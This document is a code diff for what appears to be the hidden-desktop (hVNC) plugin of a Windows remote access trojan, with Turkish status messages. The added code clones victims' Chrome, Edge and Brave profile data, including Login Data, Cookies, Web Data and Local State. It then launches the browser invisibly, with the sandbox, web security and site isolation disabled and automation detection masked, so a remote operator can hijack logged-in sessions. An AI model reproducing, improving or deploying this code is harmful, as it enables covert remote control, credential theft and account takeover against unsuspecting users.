@@ -5,6 +5,9 @@
 #include <uxtheme.h>
 #include <dwmapi.h>
 #include <propidl.h>
+#include <shlobj.h>
+#include <shlwapi.h>
+#include <shellapi.h>
 #include <gdiplus.h>
 #include <objidl.h>
 #include <algorithm>
@@ -30,6 +33,8 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "uxtheme.lib")
 #pragma comment(lib, "dwmapi.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 using json = nlohmann::json;
 using namespace Gdiplus;
@@ -1134,6 +1139,109 @@ static wstring utf8_to_wstring(const string& str) {
     return res;
 }
 
+static string wstring_to_utf8(const wstring& wstr) {
+    if (wstr.empty()) return string();
+    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    if (size <= 0) return string();
+    string res(size, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
+    if (!res.empty() && res.back() == '\0') res.pop_back();
+    return res;
+}
+
+static wstring GetEnvVar(const wstring& name) {
+    wchar_t buf[MAX_PATH];
+    DWORD res = GetEnvironmentVariableW(name.c_str(), buf, MAX_PATH);
+    if (res > 0 && res < MAX_PATH) return wstring(buf);
+    return L"";
+}
+
+static bool CopyFileIfExists(const wstring& src, const wstring& dst) {
+    if (!PathFileExistsW(src.c_str())) return false;
+    // Create directory if not exists
+    wstring dir = dst;
+    PathRemoveFileSpecW(&dir[0]);
+    SHCreateDirectoryExW(NULL, dir.c_str(), NULL);
+    return CopyFileW(src.c_str(), dst.c_str(), FALSE) != FALSE;
+}
+
+static void CopyProfileEssential(const wstring& srcRoot, const wstring& dstRoot) {
+    SHCreateDirectoryExW(NULL, dstRoot.c_str(), NULL);
+
+    // 1. Copy Local State (Root)
+    CopyFileIfExists(srcRoot + L"\\Local State", dstRoot + L"\\Local State");
+
+    // 2. Scan for Profiles (Default, Profile 1, etc.)
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW((srcRoot + L"\\*").c_str(), &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                wstring name = fd.cFileName;
+                if (name == L"." || name == L"..") continue;
+
+                // Essential profile folders: Default or Profile X
+                if (name == L"Default" || name.find(L"Profile") == 0) {
+                    wstring srcP = srcRoot + L"\\" + name;
+                    wstring dstP = dstRoot + L"\\" + name;
+                    SHCreateDirectoryExW(NULL, dstP.c_str(), NULL);
+
+                    // Essential Files in Profile
+                    const wchar_t* files[] = {
+                        L"\\Preferences", L"\\Secure Preferences", L"\\Web Data",
+                        L"\\Login Data", L"\\Cookies", L"\\History", L"\\Top Sites",
+                        L"\\Bookmarks", L"\\Last Session", L"\\Last Tabs"
+                    };
+                    for (const auto& f : files) {
+                        CopyFileIfExists(srcP + f, dstP + f);
+                    }
+
+                    // Network/Cookies (Newer Chrome)
+                    SHCreateDirectoryExW(NULL, (dstP + L"\\Network").c_str(), NULL);
+                    CopyFileIfExists(srcP + L"\\Network\\Cookies", dstP + L"\\Network\\Cookies");
+                    CopyFileIfExists(srcP + L"\\Network\\Trust Tokens", dstP + L"\\Network\\Trust Tokens");
+                }
+            }
+        } while (FindNextFileW(hFind, &fd));
+        FindClose(hFind);
+    }
+}
+
+struct BrowserPaths {
+    wstring exe;
+    wstring userData;
+    wstring name;
+};
+
+static bool GetBrowserInfo(const string& filename, BrowserPaths& info) {
+    wstring localApp = GetEnvVar(L"LOCALAPPDATA");
+    if (localApp.empty()) return false;
+
+    if (filename == "chrome.exe") {
+        info.name = L"Chrome";
+        info.exe = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+        if (!PathFileExistsW(info.exe.c_str()))
+             info.exe = L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
+        info.userData = localApp + L"\\Google\\Chrome\\User Data";
+        return true;
+    } else if (filename == "msedge.exe") {
+        info.name = L"Edge";
+        info.exe = L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
+        if (!PathFileExistsW(info.exe.c_str()))
+            info.exe = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+        info.userData = localApp + L"\\Microsoft\\Edge\\User Data";
+        return true;
+    } else if (filename == "brave.exe") {
+        info.name = L"Brave";
+        info.exe = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+        if (!PathFileExistsW(info.exe.c_str()))
+            info.exe = L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+        info.userData = localApp + L"\\BraveSoftware\\Brave-Browser\\User Data";
+        return true;
+    }
+    return false;
+}
+
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     initialize_visual_styles();
     g_socket = sock;
@@ -1198,26 +1306,73 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             ensure_desktop();
             if (!g_hHiddenDesktop) return;
 
-            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            vector<wchar_t> cmdLine(path.begin(), path.end());
-            cmdLine.push_back(L'\0');
+            thread([cmd]() {
+                if (!SetThreadDesktop(g_hHiddenDesktop)) return;
 
-            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-            STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-            si.dwFlags      = STARTF_USESHOWWINDOW;
-            si.wShowWindow  = SW_SHOW;
+                string requestedPath = cmd.value("path", "cmd.exe");
+                wstring path = utf8_to_wstring(requestedPath);
+                BrowserPaths bInfo;
+                bool isBrowser = GetBrowserInfo(requestedPath, bInfo);
+                wstring cmdLineStr;
 
-            PROCESS_INFORMATION pi = { 0 };
-            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-                g_forceFullFrame = true;
-                send_status("Process started on hidden desktop");
-            } else {
-                send_error("Failed to start process. Error: " + to_string(GetLastError()));
-            }
+                if (isBrowser) {
+                    wstring tempBase = GetEnvVar(L"TEMP");
+                    if (tempBase.empty()) tempBase = L"C:\\Windows\\Temp";
+
+                    wstring clonePath = tempBase + L"\\hvncp_" + bInfo.name;
+
+                    // Only clone if hVNC profile doesn't exist to speed up subsequent launches
+                    if (!PathFileExistsW(clonePath.c_str())) {
+                        send_status("Profiller kopyalanıyor...");
+                        CopyProfileEssential(bInfo.userData, clonePath);
+                    }
+
+                    // Always cleanup locks to allow launching even if main browser is open
+                    DeleteFileW((clonePath + L"\\SingletonLock").c_str());
+                    DeleteFileW((clonePath + L"\\SingletonCookie").c_str());
+                    DeleteFileW((clonePath + L"\\SingletonSocket").c_str());
+
+                    send_status("'" + wstring_to_utf8(bInfo.name) + "' tarayıcı açılıyor...");
+
+                    // Common flags for stability, isolation and GUI visibility on hidden desktop
+                    cmdLineStr = L"\"" + bInfo.exe + L"\" --user-data-dir=\"" + clonePath +
+                                 L"\" --no-sandbox --test-type --password-store=basic --disable-gpu "
+                                 L"--disable-software-rasterizer --disable-gpu-compositing --disable-gpu-sandbox "
+                                 L"--no-first-run --no-default-browser-check --disable-blink-features=AutomationControlled "
+                                 L"--allow-running-insecure-content --disable-web-security "
+                                 L"--disable-features=CalculateNativeWinOcclusion,IsolateOrigins,site-per-process "
+                                 L"--disable-backgrounding-occluded-windows --disable-renderer-backgrounding "
+                                 L"--window-size=1280,720 --start-maximized --disable-infobars --remote-debugging-port=0";
+
+                    // Brave specific isolation
+                    if (requestedPath == "brave.exe") {
+                        cmdLineStr += L" --disable-brave-update --disable-brave-rewards";
+                    }
+                } else {
+                    cmdLineStr = path;
+                }
+
+                vector<wchar_t> cmdLine(cmdLineStr.begin(), cmdLineStr.end());
+                cmdLine.push_back(L'\0');
+
+                wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+                STARTUPINFOW si = { sizeof(si) };
+                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+                si.dwFlags      = STARTF_USESHOWWINDOW;
+                si.wShowWindow  = SW_SHOW;
+
+                PROCESS_INFORMATION pi = { 0 };
+                // Using 0 for dwCreationFlags to ensure GUI initializes correctly on some Windows versions
+                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                   0, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    g_forceFullFrame = true;
+                    send_status("Process started on hidden desktop");
+                } else {
+                    send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                }
+            }).detach();
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
                    action == "hvnc_char" ||
